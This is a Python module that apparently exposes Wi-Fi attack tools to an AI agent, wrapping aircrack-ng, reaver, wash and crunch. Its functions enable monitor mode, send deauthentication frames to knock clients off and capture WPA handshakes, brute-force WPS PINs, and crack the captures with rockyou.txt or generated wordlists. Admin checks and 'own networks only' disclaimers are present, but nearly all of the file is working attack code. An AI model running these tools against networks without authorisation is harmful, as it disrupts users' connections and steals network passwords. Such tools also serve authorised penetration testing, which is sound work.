"""WiFi security testing tools. Use only on networks you own or have explicit permission to test."""
from __future__ import annotations

import logging
import os
import subprocess
import time
from pathlib import Path

from core.registry import tool

logger = logging.getLogger(__name__)

_WIRELESS_SUDOERS = "/etc/sudoers.d/plia-wireless"
_ROCKYOU = "/usr/share/wordlists/rockyou.txt"


def _has_wireless_admin() -> bool:
    from core.config import get_config
    cfg = get_config()
    wireless_tools = (
        "start_monitor_mode", "stop_monitor_mode",
        "capture_handshake", "attack_wps", "scan_wps_networks",
    )
    return (
        Path(_WIRELESS_SUDOERS).exists()
        and any(cfg.tool_permissions.get(t) == "admin" for t in wireless_tools)
    )


def _run(*cmd: str, timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(list(cmd), capture_output=True, text=True, timeout=timeout)


def _sudo(*cmd: str, timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(["sudo"] + list(cmd), capture_output=True, text=True, timeout=timeout)


def _bin_missing(name: str) -> str | None:
    r = subprocess.run(["which", name], capture_output=True)
    return name if r.returncode != 0 else None


@tool(description="Install aircrack-ng suite and wireless testing tools (airmon-ng, airodump-ng, aireplay-ng, reaver, wash, crunch).")
def install_wireless_tools() -> str:
    r = subprocess.run(
        ["sudo", "apt-get", "install", "-y", "aircrack-ng", "reaver", "crunch"],
        capture_output=True, text=True, timeout=120,
    )
    if r.returncode != 0:
        return f"Install failed: {r.stderr.strip()[-500:]}"
    installed = []
    for b in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "wash", "crunch"):
        if not _bin_missing(b):
            installed.append(b)
    return f"Installed. Available: {', '.join(installed)}"


@tool(description="Put a wireless interface into monitor mode for packet capture. Requires Admin permission and Wireless Tools sudoers grant. Usage: interface=wlan0")
def start_monitor_mode(interface: str = "wlan0") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions and run the Wireless Tools grant command."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    # Skip 'airmon-ng check kill' — it would kill NetworkManager and crash this server
    r = _sudo("airmon-ng", "start", interface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    mon = interface + "mon"
    return f"Monitor mode started on {mon}\n{out}"


@tool(description="Stop monitor mode and restore interface to managed mode. Requires Admin permission. Usage: interface=wlan0mon")
def stop_monitor_mode(interface: str = "wlan0mon") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    r = _sudo("airmon-ng", "stop", interface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    _sudo("service", "network-manager", "restart", timeout=10)
    return f"Monitor mode stopped on {interface}. Network manager restarted."


@tool(description="Scan WiFi networks using monitor mode interface (airodump-ng). More detailed than nmcli scan. Requires Admin + monitor mode interface. Args: interface (monitor mode, e.g. wlan0mon), scan_seconds (default 15)")
def monitor_scan_networks(interface: str, scan_seconds: int = 15) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface:
        return "interface required (must be in monitor mode, e.g. wlan0mon)."
    miss = _bin_missing("airodump-ng")
    if miss:
        return "airodump-ng not found. Run: install_wireless_tools"
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        try:
            time.sleep(min(scan_seconds, 30))
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
        csv_file = prefix + "-01.csv"
        if not Path(csv_file).exists():
            return "No scan output. Ensure interface is in monitor mode."
        lines = Path(csv_file).read_text(errors="replace").splitlines()
    networks = []
    in_ap = True
    for line in lines:
        if line.strip() == "":
            in_ap = False
            continue
        if not in_ap or line.startswith("BSSID"):
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) >= 14:
            bssid, _, _, ch, _, _, _, _, _, _, enc, _, _, essid = parts[:14]
            networks.append((essid or "<hidden>", bssid, ch.strip(), enc.strip()))
    if not networks:
        return "No networks found in scan window."
    w = max(len(n[0]) for n in networks)
    header = f"{'ESSID':<{w}}  BSSID              CH  ENC"
    rows = [f"{e:<{w}}  {b}  {c:>2}  {enc}" for e, b, c, enc in networks]
    return "\n".join([header] + rows)


@tool(description="Capture a WPA handshake. Sends deauth frames to force client reconnect. Use only on networks you own or have permission to test. Args: interface (monitor mode), bssid, channel, output_dir (default /tmp)")
def capture_handshake(interface: str, bssid: str, channel: str, output_dir: str = "/tmp") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    for b in ("airodump-ng", "aireplay-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    prefix = os.path.join(output_dir, f"plia_{bssid.replace(':', '')}")
    dump_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", prefix, interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(5)
        _sudo("aireplay-ng", "-0", "5", "-a", bssid, interface, timeout=20)
        time.sleep(10)
    finally:
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
    cap_file = prefix + "-01.cap"
    if Path(cap_file).exists() and Path(cap_file).stat().st_size > 0:
        return f"Capture saved to {cap_file}\nRun crack_handshake_rockyou or crack_handshake_wordlist to test."
    return f"No handshake captured at {cap_file}. Try again — client must reconnect during capture window."


@tool(description="Create a wordlist using crunch for password testing. Args: min_len, max_len (max 12), charset (default lowercase+digits), output_file")
def create_wordlist(min_len: int = 8, max_len: int = 8, charset: str = "abcdefghijklmnopqrstuvwxyz0123456789", output_file: str = "/tmp/plia_wordlist.txt") -> str:
    if min_len < 1 or max_len > 12 or min_len > max_len:
        return "min_len must be ≥1, max_len ≤12, min_len ≤ max_len."
    if _bin_missing("crunch"):
        return "crunch not found. Run: install_wireless_tools"
    r = _run("crunch", str(min_len), str(max_len), charset, "-o", output_file, timeout=120)
    if r.returncode != 0:
        return f"Failed: {r.stderr.strip()}"
    size = Path(output_file).stat().st_size if Path(output_file).exists() else 0
    return f"Wordlist saved to {output_file} ({size // 1024} KB)"


@tool(description="Scan for WPS-enabled networks using wash. Requires monitor mode interface. Args: interface (monitor mode), scan_seconds (default 20)")
def scan_wps_networks(interface: str, scan_seconds: int = 20) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface:
        return "interface required (must be in monitor mode)."
    if _bin_missing("wash"):
        return "wash not found. Run: install_wireless_tools"
    proc = subprocess.Popen(
        ["sudo", "wash", "-i", interface],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
    )
    lines: list[str] = []
    deadline = time.time() + scan_seconds
    try:
        while time.time() < deadline:
            try:
                line = proc.stdout.readline()  # type: ignore[union-attr]
            except Exception:
                break
            if line:
                lines.append(line.rstrip())
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
    results = [l for l in lines if l and not l.startswith("BSSID") and not l.startswith("-") and not l.startswith("[")]
    if not results:
        return "No WPS networks found."
    return "\n".join(["BSSID              Ch  dBm  WPS  Lck  ESSID"] + results)


@tool(description="Attack WPS PIN on a target network using reaver. Use only on networks you own or have permission to test. Requires monitor mode. Args: interface, bssid, channel")
def attack_wps(interface: str, bssid: str, channel: str) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    if _bin_missing("reaver"):
        return "reaver not found. Run: install_wireless_tools"
    r = subprocess.run(
        ["sudo", "reaver", "-i", interface, "-b", bssid, "-c", channel, "-vv", "-t", "5", "-d", "1"],
        capture_output=True, text=True, timeout=120,
    )
    output = (r.stdout + r.stderr).strip()
    for line in output.splitlines():
        if "WPA PSK" in line or "WPS PIN" in line:
            return line.strip()
    return output[-1000:] if output else "No output from reaver."


@tool(description="Crack a WPA handshake capture file using rockyou.txt. Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_rockyou(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    wordlist = _ROCKYOU
    gz = wordlist + ".gz"
    if not Path(wordlist).exists():
        if Path(gz).exists():
            return f"rockyou.txt is compressed. Run: sudo gunzip {gz}"
        return "rockyou.txt not found. Run: sudo apt install wordlists && sudo gunzip /usr/share/wordlists/rockyou.txt.gz"
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
    out = (r.stdout + r.stderr)
    for line in out.splitlines():
        if "KEY FOUND" in line:
            return line.strip()
    return out.strip()[-500:] or "Key not found in rockyou.txt."


@tool(description="Crack a WPA handshake using a custom wordlist file. Use only on networks you own or have permission to test. Args: capture_file, bssid, wordlist_file")
def crack_handshake_wordlist(capture_file: str, bssid: str, wordlist_file: str) -> str:
    if not capture_file or not bssid or not wordlist_file:
        return "capture_file, bssid, and wordlist_file are required."
    for f in (capture_file, wordlist_file):
        if not Path(f).exists():
            return f"File not found: {f}"
    if _bin_missing("aircrack-ng"):
        return "aircrack-ng not found. Run: install_wireless_tools"
    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist_file, timeout=600)
    out = (r.stdout + r.stderr)
    for line in out.splitlines():
        if "KEY FOUND" in line:
            return line.strip()
    return out.strip()[-500:] or "Key not found in wordlist."


@tool(description="Crack a WPA handshake without a prepared wordlist by generating candidates on the fly (digits only, 8-10 chars). Use only on networks you own or have permission to test. Args: capture_file, bssid")
def crack_handshake_auto(capture_file: str, bssid: str) -> str:
    if not capture_file or not bssid:
        return "capture_file and bssid are required."
    if not Path(capture_file).exists():
        return f"File not found: {capture_file}"
    for b in ("crunch", "aircrack-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    wordlist = f"/tmp/plia_auto_{bssid.replace(':', '')}.txt"
    gen = _run("crunch", "8", "10", "0123456789", "-o", wordlist, timeout=60)
    if gen.returncode != 0:
        return f"crunch failed: {gen.stderr.strip()}"
    try:
        crack = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
        out = (crack.stdout + crack.stderr)
        for line in out.splitlines():
            if "KEY FOUND" in line:
                return line.strip()
        return out.strip()[-500:] or "Key not found with auto-generated wordlist."
    finally:
        try:
            Path(wordlist).unlink()
        except Exception:
            pass
